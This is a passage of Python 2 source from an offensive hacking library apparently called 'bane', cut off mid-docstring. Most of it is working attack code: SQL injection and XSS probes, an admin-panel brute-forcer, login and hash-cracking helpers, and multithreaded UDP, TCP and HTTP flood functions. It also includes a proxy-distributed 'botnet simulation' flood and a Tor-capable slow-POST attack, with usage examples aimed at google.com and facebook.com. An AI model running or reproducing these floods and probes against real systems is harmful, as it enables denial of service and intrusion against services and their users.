   the function takes 5 arguments:

   u: the link to check
   delay: time giving as a delay for the database to do before returning the response
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlitb(domain)
   
   if returning was set to: True
   0 => not vulnerable
   1 => vulnerable

   timeout: (set by default to: 25) timeout flag for the request
'''
 s=0
 try:
  if logs==True:
   print'[*]Time Based SQL Injection test'
  t=time.time()
  r=requests.get(u+"-SLEEP("+str(delay)+")",proxies=proxy,timeout=timeout)
  if ((time.time()-t>=delay)and (r.status_code==200)):
    s+=1
 except:
  pass
 if logs==True:
  if s==0:
   print'[-]Not vulnerable'
  if s==1:
   print'[+]Vulnerable!!!'
 if returning==True:
  return s
def myip(logs=True,returning=False):
 '''
   this function is for getting your ip using: ipinfo.io

   it takes 2 arguments:   

   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning the report as a string format if it is set to: True

   usage:

   >>>import bane
   >>>bane.myip()
   xxx.xx.xxx.xxx
   >>>print bane.myip(returnin=True,logs=False)
   xxx.xxx.xx.xxx
'''
 c=""
 try:
   c+=requests.get("http://ipinfo.io/ip",timeout=10).text
 except:
  pass
 if logs==True:
  print c.strip()
 if returning==True:
  return c.strip()
'''
   functions below are using: api.hackertarget.com services to gather up any kind of informations about any given ip or domain

   they take 3 arguments:

   u: ip or domain
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning the report as a string format if it is set to: True

   general usage:

   >>>import bane
   >>>ip='50.63.33.34'
   >>>bane.dnslookup(ip)
   >>>bane.traceroute(ip)
   >>>bane.nmap(ip)

   etc...
'''
def dnslookup(u,logs=True,returning=False,proxy={}):
 '''
   this function is for: DNS look up
 '''
 c=''
 try:
  c=requests.get("https://api.hackertarget.com/dnslookup/?q="+u,proxies=proxy,timeout=10).text
 except:
  pass
 if logs==True:
  print c.strip()
 if returning==True:
  return c.strip()
def whois(u,logs=True,returning=False,proxy={}):
 '''
   this function is for: whois
 '''
 c=''
 try:
   c=requests.get("https://api.hackertarget.com/whois/?q="+u,proxies=proxy,timeout=10).text
 except:
  pass
 if logs==True:
  print c.strip()
 if returning==True:
  return c.strip()
def traceroute(u,logs=True,returning=False,proxy={}):
 '''
   this function is for: tracerout
 '''
 c=""
 try:
   c=requests.get("https://api.hackertarget.com/mtr/?q="+u,proxies=proxy,timeout=10).text
 except:
  pass
 if logs==True:
  print c.strip()
 if returning==True:
  return c.strip()
def reversedns(u,logs=True,returning=False,proxy={}):
 '''
   this function is for: reverse DNS look up
 '''
 c=""
 try:
   c=requests.get("https://api.hackertarget.com/reversedns/?q="+u,proxies=proxy,timeout=10).text
 except:
  pass
 if logs==True:
  print c.strip()
 if returning==True:
  return c.strip()
def geoip(u,logs=True,returning=False,proxy={}):
 '''
   this function is for getting: geoip informations
 '''
 c=""
 try:
   c=requests.get("https://api.hackertarget.com/geoip/?q="+u,proxies=proxy,timeout=10).text
 except:
  pass
 if logs==True:
  print c.strip()
 if returning==True:
  return c.strip()
def nmap(u,logs=True,returning=False,proxy={}):
 '''
   this function is for: nmap
 '''
 c=""
 try:
   c=requests.get("https://api.hackertarget.com/nmap/?q="+u,proxies=proxy,timeout=10).text
 except:
  pass
 if logs==True:
  print c.strip()
 if returning==True:
  return c.strip()
def reverseiplookup(u,logs=True,returning=False,proxy={}):
 '''
   this function is for: reverse ip look up
 '''
 c=""
 try:
   c=requests.get("https://api.hackertarget.com/reverseiplookup/?q="+u,proxies=proxy,timeout=10).text
 except:
  pass
 if logs==True:
  print c.strip()
 if returning==True:
  return c.strip()
'''
   end of the information gathering functions using: api.hackertarget.com
'''
def ips(u,logs=True,returning=False):
 '''
   this function resolves the domain to all its associated ip addresses

   u: ip or domain
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning the report as a string format if it is set to: True.

   usage:

   >>>import bane
   >>>bane.ips('www.google.com')
   >>>a=bane.ips('www.facebook.com',returning=True)
 '''
 i=[]
 try:
   c= socket.getaddrinfo( u, 80)
   for x in c:
    x= x[4][0]
    if ('.' in x) and (x not in i):
     if logs==True:
      print x
     i.append(x)
 except:
   pass
 if returning==True:
   return i
def udp(u,port=80,ports=None,level=3,size=3,connection=True):
  '''
   this function is for UDP flood attack tests.
   
   it takes 5 arguments:

   u: targeted ip
   port: (set by default to: 80) targeted port
   ports: (set by default to: None) it is used to define a list of ports to attack all without using multithreading, if its value has changed
   to a list, the port argument will be ignored and the list will be used instead, so be careful and set everything correctly.
   it should be defined as a list of integers seperated by ',' like: [80,22,21]
   connection: (set by default to: True) to make a connection before sending the packet
   level: (set by default to: 3) it defines the speed rate to send the packets:

   level=1 :  send packets with delay of 0.1 second between them
   level=2 :  send packets with delay of 0.01 second between them
   level=3 :  send packets with delay of 0.001 second between them

   size: (set by default to: 3) multiplying the size of the generated payloads:

   size=1 :  size of payload * 1
   size=2 :  size of payload * 10
   size=3 :  size of payload * 100

   when the attack starts you will see a stats of: total packets sent, packets sent per second, and bytes sent per second

   usage:

   >>>import bane
   >>>ip='25.33.26.12'
   >>>bane.udp(ip)

   >>>bane.udp(ip,port=80,level=1,size=3)

   >>>bane.udp(ip,ports=[21,50,80],level=2)
   
  '''
  global rate1
  global rate2
  global packets
  if level<=1:
   t=.1
  elif level==2:
   t=.01
  elif level>=3:
   t=.001
  if size<=1:
   m=1
  elif size==2:
   m=10
  elif size>=3:
   m=100
  tm=time.time()
  while True:
   try:
    if ports:
     p=random.choice(ports)
    else:
     p=port
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    if connection==True:
     s.connect((u,p))
    msg=''
    for x in range(random.randint(10,30)):
     msg+=str(random.randint(0,1000000))+random.choice(lis)
    msg=msg*m
    s.sendto((msg),(u,p))
    packets+=1
    rate1+=1
    rate2+=len(msg)
    if int(time.time()-tm)==1:
     sys.stdout.write("\rStats=> Packets sent: {} | Rate: {} packets/s  {} bytes/s".format(packets,rate1,rate2))
     sys.stdout.flush()
     tm=time.time()
     rate1=0
     rate2=0
   except KeyboardInterrupt:
    break
   except Exception as e:
    print e
   time.sleep(t)
def inputs(u,value=False,timeout=10,bypass=False,proxy={}):
 '''
   this function is to get the names and values of input fields on a given webpage to scan.

   it takes 4 arguments:

   u: the page's link (http://...)
   value: (set by default to: False) to return the value of the fields set it to:True then the field's name and value will be string of 2 
   values sperated by ":"
   timeout: (set by default to: 10) timeout flag for the request
   bypass: (set by default to: False) to bypass anti-crawlers

  usage:

  >>>import bane
  >>>link='http://www.example.com'
  >>>bane.inputs(link)
  ['email','password','rememberme']
  >>>a=bane.inputs(link,value=True)
  ['email','password','rememberme:yes','rememberme:no']
  
 '''
 if bypass==True:
  u+='#'
 l=[]
 try:
  c=requests.get(u, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
  soup= BeautifulSoup(c,'html.parser')
  p=soup.find_all('input')
  for r in p: 
    v=""
    if r.has_attr('name'):
     s=str(r)
     s=s.split('name="')[1].split(',')[0]
     s=s.split('"')[0].split(',')[0]
     if (r.has_attr('value') and (value==True)):
      v=str(r)
      v=v.split('value="')[1].split(',')[0]
      v=v.split('"')[0].split(',')[0]
    if value==True:
     y=s+":"+v
    else:
     y=s
    if y not in l:
     l.append(y)
 except Exception as e:
  pass
 return l
def forms(u,value=True,timeout=10,bypass=False,proxy={}):
 '''
   same as "inputs" function but it works on forms input fields only
 '''
 if bypass==True:
  u+='#'
 l=[]
 try:
  c=requests.get(u, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
  soup= BeautifulSoup(c,'html.parser')
  i=soup.find_all('form')
  for f in i:
   p=f.find_all('input')
   for r in p: 
    v=""
    if r.has_attr('name'):
     s=str(r)
     s=s.split('name="')[1].split(',')[0]
     s=s.split('"')[0].split(',')[0]
     if (r.has_attr('value') and (value==True)):
      v=str(r)
      v=v.split('value="')[1].split(',')[0]
      v=v.split('"')[0].split(',')[0]
    if value==True:
     y=s+":"+v
    else:
     y=s
    if y not in l:
     l.append(y)
 except Exception as e:
  pass
 return l
def loginform(u,timeout=10,bypass=False,value=True,proxy={}):
 '''
   same as "inputs" function but it works on login input fields only
 '''
 if bypass==True:
  u+='#'
 l=[]
 try:
  c=requests.get(u, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
  soup= BeautifulSoup(c,'html.parser')
  i=soup.find_all('form')
  for f in i:
   p=f.find_all('input')
   for r in p: 
    v=""
    if r.has_attr('name'):
     s=str(r)
     s=s.split('name="')[1].split(',')[0]
     s=s.split('"')[0].split(',')[0]
     if (r.has_attr('value') and (value==True)):
      v=str(r)
      v=v.split('value="')[1].split(',')[0]
      v=v.split('"')[0].split(',')[0]
    if value==True:
     y=s+":"+v
    else:
     y=s
    if y not in l:
     l.append(y)
 except Exception as e:
  pass
 return l
def adminlogin(u,p,timeout=10,proxy={}):
 '''
   this function try to use the values you insert in the dictionary field "p" to make a POST request in the login page and check it the 
   credentials are correct or not by checking the response code.
   
   it takes 3 arguments:

   u: login link
   p: dictionary contains input names and values: {input's name : value} => example: {'user':'ala','pass':'ala'}
   timeout: (set by default to: 10) timeout flag for the request

   usage:

   >>>import bane
   >>>a=bane.adminlogin('http://www.example.com/admin/login.php',{'user':'ala','pass':'ala'})
   >>>if a==1:
   ... print 'logged in!!!'
 '''
 s=0
 try:
  r=requests.post(u,data=p,headers = {'User-Agent': random.choice(ua)},allow_redirects=False,proxies=proxy,timeout=timeout)
  if r.status_code==302:
   s+=1
 except:
  pass
 return s
def xssget(u,pl,extra=None,timeout=10,proxy={}):
  '''
   this function is for xss test with GET requests.

   it takes the 4 arguments:
   
   u: link to test
   pl: dictionary contains the paramter and the xss payload
   extra: if the request needs additionnal parameters you can add them there in dictionary format {param : value}
   timeout: timeout flag for the request

  '''
  i=0
  for x in pl:
   xp=pl[x]
  if extra:
   pl.update(extra)
  try:
     c=requests.get(u, params= pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
     if  HTMLParser.HTMLParser().unescape(xp).encode("utf-8") in c:
      i+=1
  except Exception as e:
   pass
  return i
def xsspost(u,pl,extra=None,timeout=10,proxy={}):
  '''
   this function is for xss test with POST requests.

   it takes the 4 arguments:
   
   u: link to test
   pl: dictionary contains the paramter and the xss payload
   extra: if the request needs additionnal parameters you can add them there in dictionary format {param : value}
   timeout: timeout flag for the request

  '''
  i=0
  for x in pl:
   xp=pl[x]
  if extra:
   pl.update(extra)
  try:
     c=requests.post(u, data= pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout ).text
     if HTMLParser.HTMLParser().unescape(xp).encode("utf-8") in c:
      i+=1
  except Exception as e:
   pass
  return i
def xss(u,payload=None,get=True,post=True,logs=True,returning=False,proxy={}):
  '''
   this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each
   input using POST and GET methods.

   it takes the following arguments:
   
   u: link to test
   payload: the xss payload to use it, if it's set to: None (set by default to: None) it uses the default payload
   get: (set by default to: True) to test the parameter using GET
   post: (set by default to: True) to test the parameter using POST
   logs: (set by default to: True) show the process
   returning: (set by dfault to: False) to return scan results of the parameters as list of strings

   usage:
  
   >>>import bane
   >>>bane.xss('http://www.example.com/')

   >>>bane.xss('http://www.example.com/',payload="<script>alert(123);</script>")
  '''
  lst=[]
  if payload:
   xp=payload
  else:
   xp='<script>alert("Vulnerable!!!");</script>'
  if logs==True:
   print"Getting parameters..."
  hu=0
  l=inputs(u)
  if len(l)==0:
   if logs==True:
    print"No parameters were found!!!"
   hu+=1
  if hu==0:
   if logs==True:
    print"Test has started...\nPayload:\n"+xp
   if '?' in u:
    u=u.split('?')[0].split(',')[0]
   for i in l:
    pl={i : xp}
    if get==True: 
     if xssget(u,pl,proxy=proxy)==1:
        x="parameter: "+i+" method: GET=> [+]Payload was found"
     else:
      x="parameter: "+i+" method: GET=> [-]Payload was not found"
     lst.append(x)
     if logs==True:
      print x
    if post==True:
     if xsspost(u,pl,proxy=proxy)==1:
     	x="parameter: "+i+" method: POST=> [+]Payload was found"
     else:
      x="parameter: "+i+" method: POST=> [-]Payload was not found"
     lst.append(x)
     if logs==True:
      print x
  if returning==True:
   return lst
def adminpanel(u,logs=True,mapping=False,returning=False,ext='php',timeout=10,proxy={}):
 '''
   this function use a list of possible admin panel links with different extensions: php, asp, aspx, js, /, cfm, cgi, brf and html.
   
   ext: (set by default to: 'php') to define the link's extention.

   usage:

  >>>import bane
  >>>bane.adminpanel('http://www.example.com',ext='php',timeout=7)

  >>>bane.adminpanel('http://www.example.com',ext='aspx',timeout=5)
 '''
 links=[]
 ext=ext.strip()
 if ext.lower()=="php":
  links=php
 elif ext.lower()=="asp":
  links=asp
 elif ext.lower()=="aspx":
  links=aspx
 elif ext.lower()=="js":
  links=js
 elif ext=="/":
  links=slash
 elif ext.lower()=="cfm":
  links=cfm
 elif ext.lower()=="cgi":
  links=cgi
 elif ext.lower()=="brf":
  links=brf
 elif ext.lower()=="html":
  links=html
 k=[]
 for i in links:
  try:
   if u[len(u)-1]=='/':
    u=u[0:len(u)-1]
   g=u+i
   if logs==True:
    print'[*]Trying:',g
   r=requests.get(g,headers = {'User-Agent': random.choice(ua)},allow_redirects=False,proxies=proxy,timeout=timeout) 
   if r.status_code == requests.codes.ok:
    if logs==True:
     print'[+]FOUND!!!'
    k.append(g)
    if mapping==False:
     break
   else:
    if logs==True:
     print'[-]failed'
  except KeyboardInterrupt:
   break
  except Exception as e:
   if logs==True:
    print '[-]Failed'
 if returning==True:
  return k
'''
   functions that take only a string as argument and return something

   usage:

   >>>import bane
   >>>bane.md5('ala')
   'e88e6128e26eeff4daf1f5db07372784'
   >>>bane.sha1('ala')
   'c6a378510e0ec1d7809694ebf1d5579f37b1642e'
'''
def escape_html(s):
 '''
   function to return escaped html string
 '''
 return cgi.escape(s,quote=True)
def unescape_html(s):
 '''
   function to return unescaped html string
 '''
 return HTMLParser.HTMLParser().unescape(s).encode("utf-8")
def md5(w):
 '''
   function to return md5 encrypted string
 '''
 return hashlib.md5(w.encode("utf-8")).hexdigest()
def sha1(w): 
 '''
   function to return sha1 encrypted string
 '''
 return hashlib.sha1(w.encode("utf-8")).hexdigest()
def sha256(w):
 '''
   function to return sha256 encrypted string
 '''
 return hashlib.sha256(w.encode("utf-8")).hexdigest()
def base64encode(w):
 '''
   function to return base64 encoded string
 '''
 return base64.b64encode(w)
def base64decode(w):
 '''
   function to return base64 decoded string
 '''
 return base64.b64decode(w)
def sha224(w):
 '''
   function to return sha224 encrypted string
 '''
 return hashlib.sha224(w.encode("utf-8")).hexdigest()
def sha384(w):
 '''
   function to return sha384 encrypted string
 '''
 return hashlib.sha384(w.encode("utf-8")).hexdigest()
def sha512(w):
 '''
   function to return sha512 encrypted string
 '''
 return hashlib.sha512(w.encode("utf-8")).hexdigest()
'''
  the following functions are taking a file path and return ecrypted content of  the file with the defined encryption method in the function's
  name.

  usage:

  >>>import bane
  >>>bane.md5fl('ala.txt')
  '66eab7dfd5c98ca5fbbbda6f7d7b36c3'
'''
def md5fl(f):
  w=""
  with open(f,"rb") as f: 
   l=f.readlines()
   for x in l:
    w+=x
  f.close()
  s= md5(w)
  return s
def sha1fl(f):
  w=""
  with open(f,"rb") as f: 
   l=f.readlines()
   for x in l:
    w+=x
  f.close()
  s= sha1(w)
  return s
def sha224fl(f):
  w=""
  with open(f,"rb") as f: 
   l=f.readlines()
   for x in l:
    w+=x
  f.close()
  s= sha224(w)
  return s
def sha256fl(f):
  w=""
  with open(f,"rb") as f: 
   l=f.readlines()
   for x in l:
    w+=x
  f.close()
  s= sha256(w)
  return s
def sha384fl(f):
  w=""
  with open(f,"rb") as f: 
   l=f.readlines()
   for x in l:
    w+=x
  f.close()
  s= sha384(w)
  return s
def sha512fl(f):
  w=""
  with open(f,"rb") as f: 
   l=f.readlines()
   for x in l:
    w+=x
  f.close()
  s= sha512(w)
  return s
def base64encodefl(f):
  w=""
  with open(f,"rb") as f: 
   l=f.readlines()
   for x in l:
    w+=x
  f.close()
  s= base64encode(w)
  return s
def base64decodefl(f):
  w=""
  with open(f,"rb") as f: 
   l=f.readlines()
   for x in l:
    w+=x
  f.close()
  s= base64decode(w)
  return s
'''
  the following functions are recommanded to be used in bruteforce attacks to crack the hashed passwords.

  they take 2 arguments:

  the first one is a word to encrypt it and compare it to the second argument that takes the hash that you are trying to crack.

  if it returns:
  0 => the hashes didn't match
  1 => the hashes has matched

  example:

  >>>hash='e88e6128e26eeff4daf1f5db07372784'
  >>>l=['admin','12345','user','ala','soul','vince']
  >>>fox word in l:
  ... print'[*]Trying:',word
      if bane.dmd5( word,hash)==1:
       print'[+]Found!!'
       break
      else:
       print'[-]failed'
'''
def dsha224(w,z):
 s=0
 w=hashlib.sha224(w.encode("utf-8")).hexdigest()
 if w==z:
   s+=1
 return s
def dsha384(w,z):
 s=0
 w=hashlib.sha384(w.encode("utf-8")).hexdigest()
 if w==z:
   s+=1
 return s
def dsha512(w,z):
 s=0
 w=hashlib.sha512(w.encode("utf-8")).hexdigest()
 if w==z:
   s+=1
 return s
def dsha256(w,z):
 s=0
 w=hashlib.sha256(w.encode("utf-8")).hexdigest()
 if w==z:
   s+=1
 return s
def dsha1(w,z):
 s=0
 w=hashlib.sha1(w.encode("utf-8")).hexdigest()
 if w==z:
   s+=1
 return s
def dmd5(w,z):
 s=0
 w=hashlib.md5(w.encode("utf-8")).hexdigest()
 if w==z:
   s+=1
 return s
'''
  function to do simple caesar encryption lol.
  
  it takes 2 arguments:

  the first one is the string to encrypt and the second is the second is the encryption key (integer between: 1 and 26)

  example:

  >>> bane.caesar('ala',5)
  'fqf'
'''
def caesar(w,k):
 a='abcdefghijklmnopqrstuvwxyz'
 b='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 c=''
 for i in w:
  if (k>26) or (k<1) or (ord(i) not in range(32,127)):
   break
  if (i in a):
   c+=a[(a.index(i)+k)%26]
  elif i in b:
   c+=b[(b.index(i)+k)%26]
  elif ord(i) in range(32,127):
    c+=i
 return c
'''
  function to do simple caesar decryption lol.
  
  it takes 2 arguments:

  the first one is the string to decrypt and the second is the second is the decryption key (integer between: 1 and 26)

  example:

  >>> bane.dcaesar('fqf',5)
  'ala'
'''
def dcaesar(w,k):
 a='abcdefghijklmnopqrstuvwxyz'
 b='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 c=''
 for i in w:
  if (k>26) or (k<1) or (ord(i) not in range(32,128)):
   break
  if (i in a):
   c+=a[(a.index(i)-k)%26]
  elif i in b:
   c+=b[(b.index(i)-k)%26]
  elif ord(i) in range(32,128):
    c+=i
 return c
'''
  the following class ("tcflood") and the "tcpflood" are used to simulate tcp flood attacks and test the server's performance under such 
  attacks.
  the class here is making connection each time to the target server then sends in random rounds count (between 15 and 50 rounds) a junked tcp 
  data (big size payloads) with a delay of 0.1 second between the packets. 
'''
class tcflood(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    s =socket.socket()
    s.settimeout(timeout)
    s.connect((target,port))
    if (port==443) or (port==8443):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for l in range(packs2,packs1):
     m=''
     for li in range(30,50): 
      m+=str(random.randint(1,1000000))+random.choice(lis)
     m=m*amp
     try:
      s.send(m)
      counter+=1
      print"[!]Packets: {} | Bytes: {}".format(counter,len(m))
     except Exception as dx:
      pass
     time.sleep(speed)
    s.close()
   except Exception as e:
    pass
   time.sleep(.1)
'''
  usage:

  >>>bane.tcpflood('www.google.com')

  >>>bane.tcpflood('www.google.com',p=80, threads=150, maxtime=5)

  p: (set by default to: 80) targeted port
  threads: (set by default to: 256) threads to use
  maxtime: (set by default to: 5) timeout flag
'''
def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=1):
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global amp
 if ampli<1:
  ampli=1
 if ampli>100:
  ampli=100
 amp=ampli
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  t=tcflood()
  t.start()
class htflood(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    s =socket.socket()
    s.settimeout(timeout)
    s.connect((target,port))
    if (port==443):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for fg in range(random.randint(packs2,packs1)):
     pa=random.choice(paths)
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
        df=random.choice(ec)
        if df!=ed:
         gy+=1
       ed+=', '
       ed+=df
     l=random.choice(al)
     for n in range(random.randint(0,5)):
      l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
     kl=random.randint(1,2)
     if kl==1:
      req="GET"
      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,16)):
       j+=random.choice(lis)
      par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*amp,100*amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),target,par)
     try:
      s.send(m)
      counter+=1
      print"[!]Request: {} | Type: {} | Bytes: {}".format(counter,req,len(m))
     except Exception as dx:
      pass
     time.sleep(speed)
    s.close()
   except Exception as e:
    pass
   time.sleep(.1)
'''
   the following functions and clases are for DoS attacks simulations with different tools that have been either originally written in 
   diffferent languages (Perl: slowloris and C: xerxes and slowread attack...) and rewritten in python and other python tools that are PoC for 
   some vulnerabilities (slow post attacks, hulk) with some modifications that has improved their performance!!!

   they have similar usage like "tcpflood" function:

   >>>bane.slowloris('www.google.com',p=443,threads=20)
   >>>bane.torshammer('www.facebook.com',p=80,threads=1000,settor=False)
   (settor: (set by default to: False) to enable connection through local tor's local socks5 proxy
   >>>bane.hulk('www.google.com',threads=700)
   >>>bane.synflood('50.63.33.34',threads=100)

   there will be lessons how to use them all don't worry guys xD
'''
def httpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=1):
 '''
   this function is for http flood attack. it connect to a given port and flood it with http requests (GET & POST) with randomly headers values to make each request uniques with bypass caching engines techniques.
   it takes the following parameters:

   u: the target ip or domain
   p: (set by default to: 80) the port used in the attack
   threads: (set by default to: 256) the number of threading that you are going to use
   maxtime: (set by default to: 5) the timeout flag value

   example:

   >>>import bane
   >>>bane.httpflood('www.google.com',p=80,threads=500,maxtime=7)

'''
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global amp
 if ampli<1:
  ampli=1
 if ampli>10:
  ampli=10
 amp=ampli
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  t=htflood()
  t.start()
class prflood(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    z=random.randint(1,20)
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     line=random.choice(httplist)
    elif (z in [13,14,15,16]):
     line=random.choice(socks4list)
    elif (z in [17,18,19,20]):
     line=random.choice(socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif (z in [13,14,15,16]):
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif (z in [17,18,19,20]):
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    s.settimeout(timeout)
    s.connect((target,port))
    if ((port==443) or (port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for fg in range(random.randint(packs2,packs1)):
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
        df=random.choice(ec)
        if df!=ed:
         gy+=1
       ed+=', '
       ed+=df
     l=random.choice(al)
     for n in range(random.randint(0,5)):
      l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
     pa=random.choice(paths)
     kl=random.randint(1,2)
     if kl==1:
      req="GET"
      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(5,10)):
       k+=random.choice(lis)+str(random.randint(1,1000000))
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*amp,100*amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),target,par)
     try:
      s.send(m)
      counter+=1
      print"[!]Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,counter,req,len(m))
     except Exception as dx:
      pass
     time.sleep(speed)
    s.close()
    time.sleep(.1)
   except Exception as e:
    pass
   time.sleep(.1)
def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,ampli=10,roundmin=5,roundmax=15,level=1):
 '''
   this function is for http flood attack but it distribute the around the world by passing the requests to thousands of proxies located in many countries (it is stimulation to real life botnet).
   it takes the following parameters:

   u: the target ip or domain
   p: (set by default to: 80) the port used in the attack
   threads: (set by default to: 100) the number of threading that you are going to use
   maxtime: (set by default to: 5) the timeout flag value
   httpl: (set by default to: None) it takes a list of custom http proxies list that the user provide to be used
   socks4l: (set by default to: None) it takes a list of custom socks4 proxies list that the user provide to be used
   socks5l: (set by default to: None) it takes a list of custom socks5 proxies list that the user provide to be used

   example:

   >>>import bane
   >>>bane.lulzer('www.google.com',p=80,threads=500)

'''
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global socks4list
 if socks4l:
  socks4list=socks4l
 else:
  socks4list=massocks4()
 global socks5list
 if socks5l:
  socks5list=socks5l
 else:
  socks5list=massocks5()
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global amp
 if ampli<1:
  ampli=1
 if ampli>10:
  ampli=10
 amp=ampli
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  t=prflood()
  t.start()
class reqpost(threading.Thread):
 def run(self):
  while True:
   try:
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout=(timeout)
    if tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((target,port))
    print"Connected to {}:{}...".format(target,port)
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    q=random.randint(10000,15000)
    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,target))
    for i in range(q):
     h=random.choice(lis)
     try:
      s.send(h)
      print"Posted: {}".format(h)
      time.sleep(random.uniform(.1,3))
     except:
      break
    s.close()
    time.sleep(.1)
   except Exception as e:
    pass
   time.sleep(.1)
def torshammer(u,p=80,threads=500,maxtime=5,settor=False):
 '''
    this function is used to do torshammer attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
    
    it takes those parameters:

    u: the target ip or domain
    p: (set by default to: 80) the targeted port
    threads: (set by default to: 500) number of connections to be created
    maxtime: (set by default to: 5) connection timeout flag value
